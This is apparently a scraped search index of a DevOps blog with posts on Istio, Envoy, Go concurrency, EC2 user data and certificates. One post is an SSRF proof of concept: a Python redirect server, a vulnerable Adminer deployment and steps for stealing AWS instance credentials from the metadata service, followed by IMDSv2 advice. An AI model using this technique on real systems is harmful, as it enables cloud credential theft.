browser"},{"body":"","link":"https://blog.wisekee.com/tags/websocket/","section":"tags","tags":null,"title":"websocket"},{"body":"","link":"https://blog.wisekee.com/tags/xtermjs/","section":"tags","tags":null,"title":"xtermjs"},{"body":"","link":"https://blog.wisekee.com/tags/cloud-init/","section":"tags","tags":null,"title":"cloud-init"},{"body":"Usually, user data scripts are only run the first time the instance is started, however this can be changed using cloud-init to run every time the instance restarts.\nCreate the cloud config file 1Content-Type: multipart/mixed; boundary=\u0026#34;//\u0026#34; 2MIME-Version: 1.0 3 4--// 5Content-Type: text/cloud-config; charset=\u0026#34;us-ascii\u0026#34; 6MIME-Version: 1.0 7Content-Transfer-Encoding: 7bit 8Content-Disposition: attachment; filename=\u0026#34;cloud-config.txt\u0026#34; 9 10#cloud-config 11cloud_final_modules: 12 - [scripts-user, always] 13runcmd: 14 - [ mkdir, /test-cloudinit ] 15write_files: 16 - path: /test-cloudinit/cloud-init.txt 17 content: Created by cloud-init 18 19--// 20Content-Type: text/x-shellscript; charset=\u0026#34;us-ascii\u0026#34; 21MIME-Version: 1.0 22Content-Transfer-Encoding: 7bit 23Content-Disposition: attachment; filename=\u0026#34;userdata.txt\u0026#34; 24 25#!/bin/bash 26**commands here** 27--// Encode the file content to base64 1base64 file.txt \u0026gt; file.b64.txt 2# windows os should use following command 3certutil -encode file.txt tmp.b64 \u0026amp;\u0026amp; findstr /v /c:- tmp.b64 \u0026gt; file.b64.txt 4# apply to ec2 instance 5aws ec2 modify-instance-attribute \\ 6--instance-id=xxx \\ 7--attribute userData \\ 8--value file://file.b64.txt ","link":"https://blog.wisekee.com/post/aws-ec2-userdata/","section":"post","tags":["cloud-init","AWS","ec2"],"title":"Custom the ec2 user data when instance launch"},{"body":"","link":"https://blog.wisekee.com/tags/ec2/","section":"tags","tags":null,"title":"ec2"},{"body":"","link":"https://blog.wisekee.com/tags/gateway/","section":"tags","tags":null,"title":"Gateway"},{"body":"","link":"https://blog.wisekee.com/tags/istio/","section":"tags","tags":null,"title":"Istio"},{"body":"Create the Network Loadbalance and specific the annotations 1name: \u0026#34;istio-ingressgateway\u0026#34; 2 service: 3 # type: ClusterIP 4 annotations: 5 service.beta.kubernetes.io/aws-load-balancer-name: \u0026#34;istio-ingress-gateway\u0026#34; 6 service.beta.kubernetes.io/aws-load-balancer-ssl-cert: \u0026gt;- 7 arn:aws:acm:us-east-1:xxxxxxxxxx:certificate/xxxxxxxxx 8 service.beta.kubernetes.io/aws-load-balancer-scheme: \u0026#34;internal\u0026#34; 9 # service.beta.kubernetes.io/aws-load-balancer-ssl-negotiation-policy: ELBSecurityPolicy-TLS-1-2-2017-01 10 service.beta.kubernetes.io/aws-load-balancer-type: \u0026#34;external\u0026#34; 11 service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: \u0026#34;ip\u0026#34; 12 service.beta.kubernetes.io/aws-load-balancer-backend-protocol: tcp 13 service.beta.kubernetes.io/aws-load-balancer-ssl-ports: \u0026#34;https\u0026#34; 14 service.beta.kubernetes.io/aws-load-balancer-connection-idle-timeout: \u0026#34;3600\u0026#34; 15 service.beta.kubernetes.io/aws-load-balancer-proxy-protocol: \u0026#34;*\u0026#34; 16 service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: \u0026#34;preserve_client_ip.enabled=true\u0026#34; 17 service.beta.kubernetes.io/aws-load-balancer-attributes: \u0026#34;deletion_protection.enabled=true, load_balancing.cross_zone.enabled=true\u0026#34; 18 ports: 19 - name: http2 20 port: 80 21 protocol: TCP 22 targetPort: 80 23 - name: https 24 port: 443 25 protocol: TCP 26 targetPort: 443 27 - name: tcp-kafka 28 port: 9095 29 protocol: TCP 30 targetPort: 9095 31 imagePullPolicy: \u0026#34;IfNotPresent\u0026#34; Create the EnvoyFilter to support x-forward-for header and propagation 1apiVersion: networking.istio.io/v1alpha3 2kind: EnvoyFilter 3metadata: 4 name: enable-forwared-for 5 namespace: istio-system 6spec: 7 configPatches: 8 - applyTo: NETWORK_FILTER 9 match: 10 listener: 11 filterChain: 12 filter: 13 name: envoy.filters.network.http_connection_manager 14 patch: 15 operation: MERGE 16 value: 17 name: envoy.http_connection_manager 18 typed_config: 19 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 20 skip_xff_append: false 21 use_remote_address: true 22 xff_num_trusted_hops: 1 Create the EnvoyFilter to enable the proxy protocol support 1apiVersion: networking.istio.io/v1alpha3 2kind: EnvoyFilter 3metadata: 4 name: internal-ingressgateway-proxy-protocol 5 namespace: istio-system 6spec: 7 workloadSelector: 8 labels: 9 app: istio-ingressgateway 10 configPatches: 11 - applyTo: LISTENER 12 patch: 13 operation: MERGE 14 value: 15 listener_filters: 16 - name: envoy.filters.listener.proxy_protocol 17 - name: envoy.filters.listener.tls_inspector ","link":"https://blog.wisekee.com/post/istio-nlb-proxy-protocolv2/","section":"post","tags":["Istio","Gateway","Nlb"],"title":"Istio ingress gateway enalbe proxy protocol v2 in AWS network loadbalance"},{"body":"","link":"https://blog.wisekee.com/tags/nlb/","section":"tags","tags":null,"title":"Nlb"},{"body":"","link":"https://blog.wisekee.com/tags/envoy/","section":"tags","tags":null,"title":"envoy"},{"body":"The Dockerfile from envoyproxy base image inherit 1FROM envoyproxy/envoy:v1.27-latest 2 3COPY envoy.yaml /etc/envoy/envoy.yaml 4COPY hello.wasm hello.wasm 5RUN chmod go+r /etc/envoy/envoy.yaml The EnvoyProxy config envoy.yaml 1static_resources: 2 listeners: 3 - name: main 4 address: 5 socket_address: 6 address: 0.0.0.0 7 port_value: 18000 8 filter_chains: 9 - filters: 10 - name: envoy.http_connection_manager 11 typed_config: 12 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 13 stat_prefix: ingress_http 14 codec_type: auto 15 route_config: 16 name: local_route 17 virtual_hosts: 18 - name: local_service 19 domains: 20 - \u0026#34;*\u0026#34; 21 routes: 22 - match: 23 prefix: \u0026#34;/\u0026#34; 24 direct_response: 25 status: 200 26 body: 27 inline_string: \u0026#34;example body\\n\u0026#34; 28 http_filters: 29 - name: envoy.filters.http.wasm 30 typed_config: 31 \u0026#34;@type\u0026#34;: type.googleapis.com/udpa.type.v1.TypedStruct 32 type_url: type.googleapis.com/envoy.extensions.filters.http.wasm.v3.Wasm 33 value: 34 config: 35 vm_config: 36 runtime: \u0026#34;envoy.wasm.runtime.v8\u0026#34; 37 code: 38 local: 39 filename: \u0026#34;./hello.wasm\u0026#34; 40 - name: envoy.filters.http.router 41 typed_config: 42 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.router.v3.Router 43 44admin: 45 access_log_path: \u0026#34;/dev/null\u0026#34; 46 address: 47 socket_address: 48 address: 0.0.0.0 49 port_value: 8001 The main.goto construction the wasm plugin 1// Copyright 2020-2021 Tetrate 2// 3// Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); 4// you may not use this file except in compliance with the License. 5// You may obtain a copy of the License at 6// 7// http://www.apache.org/licenses/LICENSE-2.0 8// 9// Unless required by applicable law or agreed to in writing, software 10// distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, 11// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. 12// See the License for the specific language governing permissions and 13// limitations under the License. 14 15package main 16 17import ( 18\t\u0026#34;math/rand\u0026#34; 19\t\u0026#34;time\u0026#34; 20 21\t\u0026#34;github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm\u0026#34; 22\t\u0026#34;github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/types\u0026#34; 23) 24 25const tickMilliseconds uint32 = 1000 26 27func main() { 28\tproxywasm.SetVMContext(\u0026amp;vmContext{}) 29} 30 31type vmContext struct { 32\t// Embed the default VM context here, 33\t// so that we don\u0026#39;t need to reimplement all the methods. 34\ttypes.DefaultVMContext 35} 36 37// Override types.DefaultVMContext. 38func (*vmContext) NewPluginContext(contextID uint32) types.PluginContext { 39\treturn \u0026amp;helloWorld{} 40} 41 42type helloWorld struct { 43\t// Embed the default plugin context here, 44\t// so that we don\u0026#39;t need to reimplement all the methods. 45\ttypes.DefaultPluginContext 46\tcontextID uint32 47} 48 49// Override types.DefaultPluginContext. 50func (ctx *helloWorld) OnPluginStart(pluginConfigurationSize int) types.OnPluginStartStatus { 51\trand.Seed(time.Now().UnixNano()) 52 53\tproxywasm.LogInfo(\u0026#34;OnPluginStart from Go!\u0026#34;) 54\tif err := proxywasm.SetTickPeriodMilliSeconds(tickMilliseconds); err != nil { 55\tproxywasm.LogCriticalf(\u0026#34;failed to set tick period: %v\u0026#34;, err) 56\t} 57 58\treturn types.OnPluginStartStatusOK 59} 60 61// Override types.DefaultPluginContext. 62func (ctx *helloWorld) OnTick() { 63\tt := time.Now().UnixNano() 64\tproxywasm.LogInfof(\u0026#34;It\u0026#39;s %d: random value: %d\u0026#34;, t, rand.Uint64()) 65\tproxywasm.LogInfof(\u0026#34;OnTick called\u0026#34;) 66} 67 68// Override types.DefaultPluginContext. 69func (*helloWorld) NewHttpContext(uint32) types.HttpContext { return \u0026amp;types.DefaultHttpContext{} } install TinyGo 1brew tap tinygo-org/tools 2brew install tinygo The Makefile to build and make the wasm and image 1wasm_name := hello.wasm 2image_tag := hello-v1 3 4build.wasm: 5\ttinygo build -o $(wasm_name) -scheduler=none -target=wasi main.go 6build.image: build.wasm 7\tdocker buildx build --platform=linux/amd64 -t envoyproxy/envoy:$(image_tag) . -f ./Dockerfile Dynamic change envoyproxy loggin level 1$ kubectl -n default exec \u0026#34;$(kubectl get pod -l app=helloworld -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39;)\u0026#34; -c istio-proxy pilot-agent request POST /logging\u0026#34;?wasm=info\u0026#34; Happy to wasm debug\nReference link Hello World Example code for the blog entry on same subject ","link":"https://blog.wisekee.com/post/envoyproxy-wasm/","section":"post","tags":["envoy","service mesh","wasm"],"title":"Envoyproxy write wasm plugin getting started"},{"body":"","link":"https://blog.wisekee.com/tags/service-mesh/","section":"tags","tags":null,"title":"service mesh"},{"body":"","link":"https://blog.wisekee.com/tags/wasm/","section":"tags","tags":null,"title":"wasm"},{"body":"","link":"https://blog.wisekee.com/tags/concurrency/","section":"tags","tags":null,"title":"Concurrency"},{"body":"Use for loop and ticker 1// someTask function that we call periodically. 2func someTask() { 3 fmt.Println(rand.Int() * rand.Int()) 4} 5 6// PeriodicTask runs someTask every 1 second. 7// If canceled goroutine should be stopped. 8func PeriodicTask(ctx context.Context) { 9 // Create a new ticker with a period of 1 second. 10 ticker := time.NewTicker(time.Second) 11 for { 12 select { 13 case \u0026lt;-ticker.C: 14 someTask() 15 case \u0026lt;-ctx.Done(): 16 fmt.Println(\u0026#34;stopping PeriodicTask\u0026#34;) 17 ticker.Stop() 18 return 19 } 20 } 21} 22 23func main() { 24 ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) 25 defer cancel() 26 27 go PeriodicTask(ctx) 28 29 // Create a channel to receive signals from the operating system. 30 sigCh := make(chan os.Signal, 1) 31 signal.Notify(sigCh, syscall.SIGTERM) 32 33 // The code blocks until a signal is received (e.g. Ctrl+C). 34 \u0026lt;-sigCh 35} Use errorGroup to do this 1// errFailure some custom error. 2var errFailure = errors.New(\u0026#34;some error\u0026#34;) 3 4func main() { 5 // Create errgroup with context. 6 group, qctx := errgroup.WithContext(context.Background()) 7 8 // Run first periodic task. 9 group.Go(func() error { 10 firstTask(qctx) 11 return nil 12 }) 13 14 // Run second task. 15 group.Go(func() error { 16 if err := secondTask(); err != nil { 17 return err 18 } 19 return nil 20 }) 21 22 // Wait for all tasks to complete or the error to appear. 23 if err := group.Wait(); err != nil { 24 fmt.Printf(\u0026#34;errgroup tasks ended up with an error: %v\u0026#34;, err) 25 } 26} 27 28func firstTask(ctx context.Context) { 29 var counter int 30 for { 31 select { 32 case \u0026lt;-ctx.Done(): 33 return 34 case \u0026lt;-time.After(500 * time.Millisecond): 35 fmt.Println(\u0026#34;some task\u0026#34;) 36 if counter \u0026gt; 10 { 37 return 38 } 39 counter++ 40 } 41 } 42} 43 44func secondTask() error { 45 time.Sleep(3 * time.Second) 46 return errFailure 47} batch size to go routines 1 jobWorkerBuffer := make(chan struct{}, batchSize) 2\tvar wg sync.WaitGroup 3\tfor _, it := range jobs.Items { 4\twg.Add(1) // add one job to waiting 5\tjobWorkerBuffer \u0026lt;- struct{}{} // waiting when buffer is full 6\ttask := it // before enter the go routines to save don\u0026#39;t use in routines 7\tgo func() { 8\tdefer wg.Done() // complete a job when goroute is exited 9\ttask.Do() 10\t\u0026lt;-restartBuffer // release a placeholder when task is completed 11\t}() 12\t} 13\twg.Wait() // waiting complete of all go routines pool 1var payLoad = make(chan sources.TaskPayload, 10) // first level cache to every receive 10 task to work 2var pool = tools.NewPool(20, PutTask) // second level cache to every 20 go routines to concurrency do it 3 4for v := range payLoad { 5\tpool.Run(v) 6} 7pool.Wait() 8 9// // Create a new pool 10// pool := NewPool(10, func(data interface{}) { 11// fmt.Println(data) 12// }) 13 14// // Add data to the pool 15// for i := 0; i \u0026lt; 100; i++ { 16// pool.Run(i) 17// } 18 19// // Wait for all goroutines to finish 20// pool.Wait() 21// Pool represents a pool of goroutines 22type Pool struct { 23\t// Maximum number of goroutines allowed in the pool 24\tMaxGoroutines int 25 26\t// Stack of available goroutines 27\tstack chan struct{} 28 29\t// Function to execute 30\tf func(interface{}) error 31} 32 33// NewPool creates a new Pool 34func NewPool(maxGoroutines int, f func(interface{}) error) *Pool { 35\treturn \u0026amp;Pool{ 36\tMaxGoroutines: maxGoroutines, 37\tstack: make(chan struct{}, maxGoroutines), 38\tf: f, 39\t} 40} 41 42// Run starts the goroutine pool 43func (p *Pool) Run(data interface{}) { 44\t// Add one goroutine to the stack 45\tp.stack \u0026lt;- struct{}{} 46 47\t// Execute the function 48\tgo func() { 49\tp.f(data) 50 51\t// Remove one goroutine from the stack 52\t\u0026lt;-p.stack 53\t}() 54} 55 56// Wait waits for all goroutines to finish 57func (p *Pool) Wait() { 58\tfor i := 0; i \u0026lt; p.MaxGoroutines; i++ { 59\tp.stack \u0026lt;- struct{}{} 60\t} 61\tlog.Info().Msg(\u0026#34;Waiting for pool completed\u0026#34;) 62} To waiting all parallelly go routines complete and recevies results 1func main() { 2 ch1 := make(chan string) 3 ch2 := make(chan string) 4 5 go func() { 6 for { 7 ch1 \u0026lt;- \u0026#34;from ch1\u0026#34; 8 time.Sleep(2 * time.Second) 9 } 10 }() 11 12 go func() { 13 for { 14 ch2 \u0026lt;- \u0026#34;from ch2\u0026#34; 15 time.Sleep(3 * time.Second) 16 } 17 }() 18 19 go func() { 20 for { 21 select { 22 case msg1 := \u0026lt;-ch1: 23 fmt.Println(msg1) 24 case msg2 := \u0026lt;-ch2: 25 fmt.Println(msg2) 26 } 27 } 28 }() 29 30 select {} // keep the main function alive 31} With deadline to testing 1package main 2 3import ( 4\t\u0026#34;context\u0026#34; 5\t\u0026#34;fmt\u0026#34; 6\t\u0026#34;log\u0026#34; 7\t\u0026#34;time\u0026#34; 8) 9 10func main() { 11\t// create root context 12\tctx := context.Background() 13\tch := make(chan int) 14\t// takes parent context, timeout --- return new ctx and timeout 15\t// set deadline of 2 secs from current time now, then timeout 16\tctx, cancel := context.WithDeadline(ctx, time.Now().Add(3*time.Second)) 17 18\tgo func() { 19\ttime.AfterFunc(5*time.Second, func() { 20\tcancel() 21\tch \u0026lt;- 1 22\t}) 23\t}() 24 25\tselect { 26\t// func is taking 4 sec to response 27\tcase \u0026lt;-time.After(4 * time.Second): 28\tfmt.Println(\u0026#34;Hello\u0026#34;) 29\t// but timing out after 2 sec, result context deadline exceed 30\tcase \u0026lt;-ctx.Done(): 31\tlog.Println(\u0026#34;has error\u0026#34;, ctx.Err().Error()) 32\t} 33\t\u0026lt;-ch 34} Reference Golang Concurrency Patterns: For-Select-Done, Errgroup and Worker Pool ","link":"https://blog.wisekee.com/post/golang-concurrency-patterns/","section":"post","tags":["Go","Concurrency","Goroutines"],"title":"Concurrency patterns in golang"},{"body":"","link":"https://blog.wisekee.com/tags/goroutines/","section":"tags","tags":null,"title":"Goroutines"},{"body":"","link":"https://blog.wisekee.com/tags/claims/","section":"tags","tags":null,"title":"Claims"},{"body":"Create RequestAuthentication and AuthorizationPolicy resources 1apiVersion: security.istio.io/v1beta1 2kind: RequestAuthentication 3metadata: 4 name: \u0026#34;request-authentication-sso\u0026#34; 5 namespace: istio-system 6spec: 7 jwtRules: 8 - issuer: \u0026#34;https://issue.example.com/sso\u0026#34; 9 jwksUri: \u0026#34;https://issue.example.com/.well-known/openid-configuration/jwks\u0026#34; 10 outputClaimToHeaders: 11 - header: \u0026#34;x-jwt-claim-email\u0026#34; 12 claim: \u0026#34;email\u0026#34; 13 14--- 15apiVersion: security.istio.io/v1beta1 16kind: AuthorizationPolicy 17metadata: 18 name: ingress-gateway-authorization 19 namespace: istio-system 20spec: 21 selector: 22 matchLabels: 23 app: istio-ingressgateway 24 action: ALLOW 25 rules: 26 - from: 27 - source: 28 requestPrincipals: [\u0026#34;*\u0026#34;] 29 - to: 30 - operation: 31 paths: [ 32 \u0026#34;/productpage*\u0026#34;, 33 \u0026#34;/login*\u0026#34;, 34 \u0026#34;/logout*\u0026#34;, 35 \u0026#34;/static*\u0026#34; 36 ] May be need complex authorization 1--- 2# apiVersion: security.istio.io/v1beta1 3# kind: AuthorizationPolicy 4# metadata: 5# name: reviews-deny-policy 6# namespace: apps 7# spec: 8# selector: 9# matchLabels: 10# app: reviews 11 12--- 13apiVersion: security.istio.io/v1beta1 14kind: AuthorizationPolicy 15metadata: 16 name: httpbin-allow-policy 17 namespace: istio-system 18spec: 19 selector: 20 matchLabels: 21 app: istio-ingressgateway 22 action: ALLOW 23 rules: 24 - from: 25 - source: 26 principals: [\u0026#34;*\u0026#34;] 27 - to: 28 - operation: 29 paths: [ 30 \u0026#34;/status/*\u0026#34; 31 ] 32 33 # - when: 34 # - key: request.auth.claims[iss] 35 # values: [\u0026#34;*\u0026#34;] 36 37 # spec: 38 # action: ALLOW 39 # rules: 40 # - from: 41 # - source: 42 # principals: 43 # - \u0026#39;*\u0026#39; 44 # - to: 45 # - operation: 46 # paths: 47 # - /healthcheck/* 48 # selector: 49 # matchLabels: 50 # app: aaa 51 # spec: 52 # action: ALLOW 53 # rules: 54 # - from: 55 # - source: 56 # namespaces: 57 # - apps 58 # - default 59 # - source: 60 # principals: 61 # - \u0026gt;- 62 # cluster.local/ns/istio-system/sa/istio-ingressgateway-service-account ","link":"https://blog.wisekee.com/post/istio-parse-jwt/","section":"post","tags":["Istio","JWT","Claims"],"title":"Istio verify and parse jwt header"},{"body":"POC process Construct attack machine to listener and redirect the credentials url 1#!/usr/bin/env python3 2 3 4# ./redirect.py 1337 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 5 6import sys 7from http.server import HTTPServer, BaseHTTPRequestHandler 8 9if len(sys.argv)-1 != 2: 10 print(\u0026#34;\u0026#34;\u0026#34; 11 Usage: {} \u0026lt;port_number\u0026gt; \u0026lt;url\u0026gt; 12 \u0026#34;\u0026#34;\u0026#34;.format(sys.argv[0])) 13 sys.exit() 14 15class Redirect(BaseHTTPRequestHandler): 16 def do_GET(self): 17 self.send_response(301) 18 self.send_header(\u0026#39;Location\u0026#39;, sys.argv[2]) 19 self.end_headers() 20 21HTTPServer((\u0026#34;\u0026#34;, int(sys.argv[1])), Redirect).serve_forever() Install the has vulnerability program for example: Adminer v4.7.8 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 # Unique key of the Deployment instance 5 name: adminer-v4.7.8 6 namespace: default 7spec: 8 # 3 Pods should exist at all times. 9 replicas: 1 10 selector: 11 matchLabels: 12 app: adminer-v4.7.8 13 template: 14 metadata: 15 labels: 16 # Apply this label to pods and default 17 # the Deployment label selector to this value 18 app: adminer-v4.7.8 19 # annotations: 20 # instrumentation.opentelemetry.io/inject-java: \u0026#39;true\u0026#39; 21 # instrumentation.opentelemetry.io/container-names: \u0026#34;php-app-demo\u0026#34; 22 23 spec: 24 containers: 25 - name: adminer 26 # Run this image 27 image: adminer:4.7.8 28 # command: [\u0026#34;php\u0026#34;, \u0026#34;-S\u0026#34;, \u0026#34;[::]:8080\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;/var/www/html\u0026#34;] 29 imagePullPolicy: IfNotPresent 30 ports: 31 - name: http 32 containerPort: 8080 33 protocol: TCP 34 env: 35 - name: TEST_AUTOINSTRUMENTATION 36 value: test_value Execution testing Forward the port to local use kubectl port-forward deploy/adminer-v4.7.8 -n default 8080:8080 Use the Elasticsearch(beta) System to login Fill the remote python program address and port: x.x.x.x:1337 If the AWS use metadatav1 this should print the ROLE name Change the python program redirect url to add the role name to suffix Continue the login button, this shold print the credentials Use awscli and the credentials 1export AWS_ACCESS_KEY_ID=ASIAEXAMPLEEXAMPLEEE 2export AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM 3export AWS_SESSION_TOKEN=EXAMPLEEXAMPLEEXAMPLE...\u0026lt;snip\u0026gt; Please upgrade the IMDS to v2 1TOKEN=`curl -X PUT \u0026#34;http://169.254.169.254/latest/api/token\u0026#34; -H \u0026#34;X-aws-ec2-metadata-token-ttl-seconds: 21600\u0026#34;` 2curl -H \u0026#34;X-aws-ec2-metadata-token: $TOKEN\u0026#34; -v http://169.254.169.254/latest/meta-data/ Reference Ssrf to Read Local Files and Abusing the AWS metadata Exploiting SSRF in AWS Elastic Beanstalk Cloud Metadata Abuse by UNC2903 Steal EC2 Metadata Credentials via SSRF Taking the monkey work out of pentesting ","link":"https://blog.wisekee.com/post/aws-metadata-ssrf-poc/","section":"post","tags":["AWS","SSRF","Security"],"title":"AWS metadata service v1 SSRF POC"},{"body":"","link":"https://blog.wisekee.com/tags/security/","section":"tags","tags":null,"title":"Security"},{"body":"","link":"https://blog.wisekee.com/tags/ssrf/","section":"tags","tags":null,"title":"SSRF"},{"body":"Simple diagram for istio ingress gateway to access argo ui\nargo.dev.local \u0026mdash;-\u0026gt; istio-ingressgateway \u0026mdash;-\u0026gt; argo server virtual service \u0026mdash;-\u0026gt; argo distination rule \u0026mdash;-\u0026gt; argo kubernetes service\nUse the shell script generate the CA root certificate and csr for sub domain add the certificate and private key to kubernetes secrets store\n1#!/usr/bin/env bash 2 3DOMAIN_NAME=\u0026#34;dev.local\u0026#34; 4 5# create root CA certificate 6openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -subj \u0026#34;/O=$DOMAIN_NAME Inc./CN=$DOMAIN_NAME\u0026#34; -keyout $DOMAIN_NAME.key -out $DOMAIN_NAME.crt 7 8# create the sub domain private key 9openssl req -out argo.$DOMAIN_NAME.csr -newkey rsa:2048 -nodes -keyout argo.$DOMAIN_NAME.key -subj \u0026#34;/CN=argo.$DOMAIN_NAME/O=argo from $DOMAIN_NAME\u0026#34; 10 11# create the sub domain certificate 12openssl x509 -req -days 365 -CA $DOMAIN_NAME.crt -CAkey $DOMAIN_NAME.key -set_serial 0 -in argo.$DOMAIN_NAME.csr -out argo.$DOMAIN_NAME.crt 13 14# create the k8s secrets 15kubectl create secret tls argo-dev-local-certs -n istio-system --key argo.$DOMAIN_NAME.key --cert argo.$DOMAIN_NAME.crt 16 17# create the openladp certificate 18openssl req -x509 -newkey rsa:4096 -nodes -subj \u0026#39;/CN=dc=mycomp,dc=test\u0026#39; -keyout /tmp-certs/tls.key -out /tmp-certs/tls.crt -days 365 To use the gateway istio resource define 1apiVersion: networking.istio.io/v1alpha3 2kind: Gateway 3metadata: 4 labels: 5 app: istio-ingressgateway 6 name: my-gateway 7 namespace: istio-system 8spec: 9 selector: 10 istio: ingressgateway 11 servers: 12 - hosts: 13 - \u0026#39;*\u0026#39; 14 port: 15 name: http 16 number: 80 17 protocol: HTTP 18 - hosts: 19 - \u0026#39;*\u0026#39; 20 port: 21 name: https-443 22 number: 443 23 protocol: HTTPS 24 tls: 25 mode: SIMPLE 26 credentialName: argo-dev-local-certs Create the VirtualService resource 1apiVersion: networking.istio.io/v1alpha3 2kind: VirtualService 3metadata: 4 name: argo-server 5 namespace: argo 6spec: 7 hosts: 8 - argo.dev.local 9 gateways: 10 - istio-system/my-gateway 11 http: 12 - name: argo-server 13 route: 14 - destination: 15 host: argo-server.argo.svc.cluster.local 16 port: 17 number: 2746 Because the argo use selfsign to listener so need a DistinationRule to hold tls upstream 1apiVersion: networking.istio.io/v1alpha3 2kind: DestinationRule 3metadata: 4 name: tls-foo 5 namespace: argo 6spec: 7 host: argo-server.argo.svc.cluster.local 8 9 trafficPolicy: 10 tls: 11 mode: SIMPLE Useful openssl command 1# extract the crtificate pem file from base64 crt file 2openssl base64 -d -in test.crt -out k8s_crt.pem 3# decode the base64 private key to pem file 4openssl base64 -d -in test.key -out k8s_key.pem ","link":"https://blog.wisekee.com/post/self-sign-certificate-for-istio-ingressgateway/","section":"post","tags":["istio","service mesh","selfsign certificate"],"title":"Generate the self sign certificate for istio ingress gateway"},{"body":"","link":"https://blog.wisekee.com/tags/selfsign-certificate/","section":"tags","tags":null,"title":"selfsign certificate"},{"body":"The EKS deployment should use ServiceAccount for pods\nCreate the CR to eks cluster Control the access to Istio ingress gateway through bind the securitygroup to pod network interface.\n1apiVersion: vpcresources.k8s.aws/v1beta1 2kind: SecurityGroupPolicy 3metadata: 4 name: istio-internal-ingressgateway-sg 5 namespace: istio-system 6spec: 7 serviceAccountSelector: 8 matchLabels: 9 app: istio-internal-ingressgateway 10 securityGroups: 11 groupIds: 12 - sg-xxxxxxx 13 - sg-xxxxxxx 14 - sg-xxxxxxx 15 - sg-xxxxxxx 16 - sg-xxxxxxx Reference Security groups for Pods ","link":"https://blog.wisekee.com/post/aws-eks-pod-sg/","section":"post","tags":["EKS","AWS","SecurityGroup"],"title":"AWS EKS pod attach the SecurityGroup through SecurityGroupPolicy CRD"},{"body":"","link":"https://blog.wisekee.com/tags/eks/","section":"tags","tags":null,"title":"EKS"},{"body":"","link":"https://blog.wisekee.com/tags/securitygroup/","section":"tags","tags":null,"title":"SecurityGroup"},{"body":"","link":"https://blog.wisekee.com/tags/envoyproxy/","section":"tags","tags":null,"title":"envoyproxy"},{"body":"Can view the envoryproxy default config in docker container 1# Launch the envoryproxy container 2# The 9901 port is envoryproxy admin and metrics, the 10000 port is listner 3# Then you can open http://127.0.0.1:9901 and http://127.0.0.1:10000 to view details 4docker run -it --rm -p 9901:9901 -p 10000:10000 --name envoy envoyproxy/envoy:v1.27-latest 5# Can attach and exec to container to view default config 6docker exec -it envoy cat /etc/envoy/envoy.yaml 7 8# admin: 9# address: 10# socket_address: 11# protocol: TCP 12# address: 0.0.0.0 13# port_value: 9901 14# static_resources: 15# listeners: 16# - name: listener_0 17# address: 18# socket_address: 19# protocol: TCP 20# address: 0.0.0.0 21# port_value: 10000 22# filter_chains: 23# - filters: 24# - name: envoy.filters.network.http_connection_manager 25# typed_config: 26# \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 27# scheme_header_transformation: 28# scheme_to_overwrite: https 29# stat_prefix: ingress_http 30# route_config: 31# name: local_route 32# virtual_hosts: 33# - name: local_service 34# domains: [\u0026#34;*\u0026#34;] 35# routes: 36# - match: 37# prefix: \u0026#34;/\u0026#34; 38# route: 39# host_rewrite_literal: www.envoyproxy.io 40# cluster: service_envoyproxy_io 41# http_filters: 42# - name: envoy.filters.http.router 43# typed_config: 44# \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.router.v3.Router 45# clusters: 46# - name: service_envoyproxy_io 47# connect_timeout: 30s 48# type: LOGICAL_DNS 49# # Comment out the following line to test on v6 networks 50# dns_lookup_family: V4_ONLY 51# lb_policy: ROUND_ROBIN 52# load_assignment: 53# cluster_name: service_envoyproxy_io 54# endpoints: 55# - lb_endpoints: 56# - endpoint: 57# address: 58# socket_address: 59# address: www.envoyproxy.io 60# port_value: 443 61# transport_socket: 62# name: envoy.transport_sockets.tls 63# typed_config: 64# \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext 65# sni: www.envoyproxy.io Static yaml config for Envoyproxy 1static_resources: 2 3 listeners: 4 - name: listener_0 5 address: 6 socket_address: 7 address: 0.0.0.0 8 port_value: 10000 9 filter_chains: 10 - filters: 11 - name: envoy.filters.network.http_connection_manager 12 typed_config: 13 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 14 stat_prefix: ingress_http 15 access_log: 16 - name: envoy.access_loggers.stdout 17 typed_config: 18 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.access_loggers.stream.v3.StdoutAccessLog 19 filter: 20 and_filter: 21 filters: 22 - header_filter: 23 header: 24 name: :Path 25 string_match: 26 exact: /status 27 invert_match: true 28 - header_filter: 29 header: 30 name: :Path 31 string_match: 32 exact: /liveness 33 invert_match: true 34 - header_filter: 35 header: 36 name: :Path 37 string_match: 38 exact: /readiness 39 invert_match: true 40 http_filters: 41 - name: envoy.filters.http.router 42 typed_config: 43 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.router.v3.Router 44 route_config: 45 name: local_route 46 virtual_hosts: 47 - name: local_service 48 domains: [\u0026#34;*\u0026#34;] 49 routes: 50 - match: 51 prefix: \u0026#34;/\u0026#34; 52 route: 53 host_rewrite_literal: www.envoyproxy.io 54 cluster: service_envoyproxy_io 55 56 clusters: 57 - name: service_envoyproxy_io 58 type: 